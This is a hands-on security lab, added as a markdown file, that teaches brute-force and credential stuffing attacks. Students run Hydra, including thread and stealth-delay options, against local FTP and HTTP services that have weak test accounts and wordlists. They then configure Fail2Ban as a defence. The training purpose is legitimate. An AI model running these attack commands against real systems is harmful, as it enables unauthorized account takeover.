@@ -1,0 +1,447 @@
+Brute-Force and Credential Stuffing Attacks
+Objectives
+By the end of this lab, students will be able to:
+
+Understand brute-force and credential stuffing attack methodologies
+Use Hydra to test authentication security on FTP and HTTP services
+Create custom scripts to automate credential testing
+Analyze attack patterns and implement defensive countermeasures
+Document security testing findings professionally
+Prerequisites
+Basic Linux command line proficiency
+Understanding of network protocols (HTTP, FTP)
+Familiarity with authentication mechanisms
+Basic Bash scripting knowledge
+Awareness of ethical hacking principles and legal boundaries
+Lab Environment
+Al Nafi provides pre-configured Linux cloud machines for this lab. Click Start Lab to access your environment with:
+
+Ubuntu Linux with Hydra pre-installed
+Local FTP and HTTP services
+Sample wordlists and test accounts
+All necessary tools ready to use
+Task 1: Environment Setup and Target Configuration
+Step 1: Verify Tools and Services
+Check that required tools are available:
+
+# Verify Hydra installation
+hydra -h | head -5
+
+# Check system information
+uname -a
+whoami
+Step 2: Configure Target Services
+Set up FTP and HTTP services for testing:
+
+# Install services
+sudo apt update
+sudo apt install -y vsftpd apache2
+
+# Start services
+sudo systemctl start vsftpd apache2
+sudo systemctl enable vsftpd apache2
+
+# Verify services are running
+sudo netstat -tlnp | grep -E ':(21|80)'
+Step 3: Create Test Accounts
+Create vulnerable test accounts:
+
+# Create FTP test users
+sudo useradd -m testuser1
+sudo useradd -m admin
+
+# Set weak passwords for testing
+echo 'testuser1:password123' | sudo chpasswd
+echo 'admin:admin' | sudo chpasswd
+
+# Verify creation
+cat /etc/passwd | grep -E 'testuser|admin'
+Step 4: Configure HTTP Basic Authentication
+Set up a protected web directory:
+
+# Create protected directory
+sudo mkdir -p /var/www/html/protected
+echo "<h1>Protected Area</h1>" | sudo tee /var/www/html/protected/index.html
+
+# Create password file
+sudo htpasswd -cb /etc/apache2/.htpasswd webuser password
+sudo htpasswd -b /etc/apache2/.htpasswd admin admin123
+
+# Configure Apache authentication
+sudo tee /etc/apache2/sites-available/000-default.conf > /dev/null << 'EOF'
+<VirtualHost *:80>
+    DocumentRoot /var/www/html
+    <Directory /var/www/html/protected>
+        AuthType Basic
+        AuthName "Protected Area"
+        AuthUserFile /etc/apache2/.htpasswd
+        Require valid-user
+    </Directory>
+</VirtualHost>
+EOF
+
+# Restart Apache
+sudo systemctl restart apache2
+Step 5: Create Wordlists
+Generate username and password lists:
+
+# Create username list
+cat > userlist.txt << 'EOF'
+admin
+root
+test
+testuser1
+webuser
+guest
+EOF
+
+# Create password list
+cat > passlist.txt << 'EOF'
+password
+123456
+admin
+password123
+admin123
+test
+guest
+qwerty
+letmein
+EOF
+Task 2: Brute-Force Attacks with Hydra
+Step 1: Understand Hydra Syntax
+Learn basic Hydra command structure:
+
+# Display help
+hydra -h
+
+# Basic syntax patterns:
+# hydra -l username -p password target service
+# hydra -L userlist -P passlist target service
+# hydra -L userlist -P passlist -t threads -f target service
+Step 2: Single Credential Testing
+Test individual credentials:
+
+# Test single username and password
+hydra -l testuser1 -p password123 127.0.0.1 ftp
+
+# Test single username with password list
+hydra -l admin -P passlist.txt 127.0.0.1 ftp -v
+Step 3: Full Brute-Force Attack
+Execute comprehensive attacks:
+
+# FTP brute-force with verbose output
+hydra -L userlist.txt -P passlist.txt -v -f -o ftp_results.txt 127.0.0.1 ftp
+
+# HTTP basic auth brute-force
+hydra -L userlist.txt -P passlist.txt -f -o http_results.txt 127.0.0.1 http-get /protected/
+
+# View results
+cat ftp_results.txt
+cat http_results.txt
+Step 4: Advanced Hydra Options
+Explore performance and stealth options:
+
+# Use multiple threads (faster)
+hydra -L userlist.txt -P passlist.txt -t 16 127.0.0.1 ftp
+
+# Add delays between attempts (stealth)
+hydra -L userlist.txt -P passlist.txt -W 2 127.0.0.1 ftp
+
+# Stop after first success
+hydra -L userlist.txt -P passlist.txt -f 127.0.0.1 ftp
+Task 3: Custom Attack Scripts
+Step 1: Basic Brute-Force Script Template
+Create a starter script for automated attacks:
+
+cat > brute_force.sh << 'EOF'
+#!/bin/bash
+
+# Basic Brute-Force Script Template
+# TODO: Add input validation
+# TODO: Add error handling
+# TODO: Add result parsing
+
+TARGET=$1
+SERVICE=$2
+USERLIST=$3
+PASSLIST=$4
+
+# TODO: Implement argument validation
+if [ $# -ne 4 ]; then
+    echo "Usage: $0 <target> <service> <userlist> <passlist>"
+    exit 1
+fi
+
+# TODO: Check if files exist
+
+# TODO: Run Hydra attack with appropriate options
+
+# TODO: Parse and display results
+
+# TODO: Generate summary report
+EOF
+
+chmod +x brute_force.sh
+Student Task: Complete the script by implementing:
+
+Input validation for all arguments
+File existence checks
+Hydra command execution with logging
+Result parsing and summary generation
+Step 2: Credential Stuffing Script Template
+Create a credential stuffing automation script:
+
+cat > credential_stuffing.sh << 'EOF'
+#!/bin/bash
+
+# Credential Stuffing Script Template
+# Tests known username:password pairs
+
+# Create sample credential pairs file
+cat > creds.txt << 'CREDS'
+admin:admin
+admin:password
+test:test
+webuser:password
+CREDS
+
+# TODO: Implement function to test FTP credentials
+test_ftp_login() {
+    local username=$1
+    local password=$2
+    local target=$3
+    
+    # TODO: Use curl or ftp to test login
+    # TODO: Return 0 for success, 1 for failure
+}
+
+# TODO: Implement function to test HTTP credentials
+test_http_login() {
+    local username=$1
+    local password=$2
+    local target=$3
+    local path=$4
+    
+    # TODO: Use curl to test HTTP basic auth
+    # TODO: Check HTTP response code
+    # TODO: Return 0 for success, 1 for failure
+}
+
+# TODO: Implement main credential stuffing loop
+# TODO: Read credential pairs from file
+# TODO: Test each pair against target
+# TODO: Log successful attempts
+# TODO: Generate summary statistics
+
+EOF
+
+chmod +x credential_stuffing.sh
+Student Task: Complete the script by implementing:
+
+FTP credential testing function using curl
+HTTP credential testing function
+Main loop to process credential pairs
+Success/failure logging
+Summary statistics generation
+Step 3: Attack Analysis Script Template
+Create a script to analyze attack results:
+
+cat > analyze_results.sh << 'EOF'
+#!/bin/bash
+
+# Attack Results Analyzer Template
+
+RESULTS_FILE=$1
+
+# TODO: Validate input file exists
+
+# TODO: Function to count successful logins
+count_successes() {
+    # TODO: Parse results file
+    # TODO: Count lines with successful credentials
+}
+
+# TODO: Function to extract compromised accounts
+extract_accounts() {
+    # TODO: Parse username:password pairs
+    # TODO: Format output
+}
+
+# TODO: Function to identify weak passwords
+analyze_passwords() {
+    # TODO: Extract passwords from results
+    # TODO: Categorize by strength
+    # TODO: Generate statistics
+}
+
+# TODO: Function to generate HTML report
+generate_report() {
+    # TODO: Create HTML structure
+    # TODO: Add summary statistics
+    # TODO: List compromised credentials
+    # TODO: Add security recommendations
+}
+
+# TODO: Main analysis workflow
+# TODO: Call analysis functions
+# TODO: Generate comprehensive report
+
+EOF
+
+chmod +x analyze_results.sh
+Student Task: Complete the script by implementing:
+
+Result file parsing functions
+Statistical analysis of successful attacks
+Password weakness categorization
+HTML report generation with findings
+Task 4: Defense Testing and Implementation
+Step 1: Test Rate Limiting
+Create a script to test login rate limits:
+
+cat > test_rate_limit.sh << 'EOF'
+#!/bin/bash
+
+# Rate Limiting Test Template
+
+# TODO: Function to perform rapid login attempts
+test_rate_limiting() {
+    local target=$1
+    local service=$2
+    local attempts=$3
+    
+    # TODO: Loop through attempts
+    # TODO: Record response times
+    # TODO: Detect blocking or throttling
+    # TODO: Calculate success rate
+}
+
+# TODO: Test FTP rate limiting
+# TODO: Test HTTP rate limiting
+# TODO: Compare results
+# TODO: Generate recommendations
+
+EOF
+
+chmod +x test_rate_limit.sh
+Student Task: Implement rapid connection testing to identify rate limiting effectiveness.
+
+Step 2: Configure Fail2Ban
+Set up automated intrusion prevention:
+
+# Install Fail2Ban
+sudo apt install -y fail2ban
+
+# Create custom configuration
+sudo tee /etc/fail2ban/jail.local > /dev/null << 'EOF'
+[DEFAULT]
+bantime = 600
+findtime = 300
+maxretry = 3
+
+[vsftpd]
+enabled = true
+port = ftp
+logpath = /var/log/vsftpd.log
+maxretry = 3
+
+[apache-auth]
+enabled = true
+port = http,https
+logpath = /var/log/apache2/error.log
+maxretry = 3
+EOF
+
+# Start Fail2Ban
+sudo systemctl start fail2ban
+sudo systemctl enable fail2ban
+
+# Check status
+sudo fail2ban-client status
+Step 3: Test Defense Effectiveness
+Verify that defenses work:
+
+# Trigger Fail2Ban by multiple failed attempts
+for i in {1..5}; do
+    hydra -l baduser -p badpass 127.0.0.1 ftp
+    sleep 1
+done
+
+# Check if IP was banned
+sudo fail2ban-client status vsftpd
+
+# Unban yourself for continued testing
+sudo fail2ban-client set vsftpd unbanip 127.0.0.1
+Step 4: Document Security Findings
+Create a findings template:
+
+cat > security_report.md << 'EOF'
+# Security Assessment Report
+
+## Executive Summary
+- TODO: Summarize key findings
+- TODO: List critical vulnerabilities
+- TODO: Provide risk assessment
+
+## Methodology
+- TODO: Describe testing approach
+- TODO: List tools used
+- TODO: Document test parameters
+
+## Findings
+### Compromised Accounts
+- TODO: List successful credential discoveries
+- TODO: Categorize by severity
+
+### Weak Passwords Identified
+- TODO: List weak password patterns
+- TODO: Provide statistics
+
+## Recommendations
+1. TODO: Immediate actions required
+2. TODO: Short-term improvements
+3. TODO: Long-term security strategy
+
+## Conclusion
+- TODO: Overall security posture assessment
+- TODO: Priority action items
+EOF
+Student Task: Complete the report with actual findings from your testing.
+
+Expected Outcomes
+After completing this lab, you should have:
+
+Successfully executed brute-force attacks against FTP and HTTP services
+Identified weak credentials through automated testing
+Created functional attack automation scripts
+Implemented and tested defensive countermeasures
+Generated professional security assessment documentation
+Troubleshooting Tips
+Issue: Hydra shows "connection refused"
+
+Solution: Verify target service is running with sudo systemctl status vsftpd or sudo systemctl status apache2
+Issue: No results in output file
+
+Solution: Check file permissions and ensure -o flag is used correctly. Verify credentials exist in wordlists.
+Issue: Fail2Ban not blocking attacks
+
+Solution: Check log paths in jail.local match actual log locations. Verify service is running with sudo fail2ban-client status
+Issue: Scripts fail with permission errors
+
+Solution: Ensure scripts are executable (chmod +x script.sh) and run with appropriate privileges
+Conclusion
+This lab demonstrated practical brute-force and credential stuffing attack techniques using industry-standard tools. You learned to automate security testing, analyze results, and implement defensive measures. These skills are essential for security professionals conducting authorized penetration testing and vulnerability assessments.
+
+Key Takeaways:
+
+Brute-force attacks exploit weak passwords and lack of rate limiting
+Automated tools like Hydra significantly increase attack efficiency
+Defensive measures (Fail2Ban, rate limiting, strong passwords) are critical
+Professional documentation is essential for security assessments
+Next Steps:
+
+Research advanced evasion techniques
+Explore multi-factor authentication bypass methods
+Study enterprise-grade intrusion prevention systems
+Practice on authorized platforms like HackTheBox or TryHackMe
+Ethical Reminder: Only perform these techniques on systems you own or have explicit written permission to test. Unauthorized access is illegal and unethical.
